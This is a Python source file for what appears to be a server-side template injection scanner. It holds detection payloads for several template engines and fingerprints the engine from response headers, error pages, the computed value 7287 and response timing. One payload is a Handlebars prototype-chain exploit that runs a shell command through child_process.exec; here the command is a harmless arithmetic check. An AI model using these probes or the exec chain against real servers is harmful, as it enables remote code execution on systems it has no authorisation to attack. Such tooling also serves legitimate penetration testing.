import requests as req



class basic:
    def __init__(self):
        self.keyw =  ["handlebars","ruby","tornado","jinja","freemarker","mako","java","velocity","jade","twig"]
        self.error = '''${{<%[%'"}}%\\'''
        self.pay = ["${347*21}",
        "${{347*21}}",
        "#set ($run=347*21) $run",
        "<%= 347 * 21 %>",
        "{{ 347*21 }}",
        "{{347*'21'}}",
        "(347*21)",
        '''<%
x=347*21
%>
${x}''',
'''wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('expr 347 \\* 21');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}'''
        ]

    def headers(self,obj):
        # Search for X-Powered-By
        head = obj[0].headers
        if 'X-Powered-By' in head:
            print(head['X-Powered-By'].lower())
            if head['X-Powered-By'].lower() in self.keyw:
                return head['X-Powered-By'].lower()
        return False

    def errorf(self,obj):
        # Basic test payload to trigger error
        for l in obj:
            a = l[0]
            code = a.status_code
            if code == 500:
                for i in self.keyw:
                    if i in a.text.lower():
                        return i
        return False

    def recon(self,obj,payload):
        # Basic payloads to identify the template
        for l in obj:
            a,p,s = l[0],l[1],l[2]

            text = a.text
            if '7287' in text or '7,287' in text or '7.287' in text or '''wrtz
      e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            [object Object]''' in text:
                return payload,p,s
        return False

    def system(self,obj,t):
        a = obj.elapsed.total_seconds()
        if a > t:
            return True
        return False
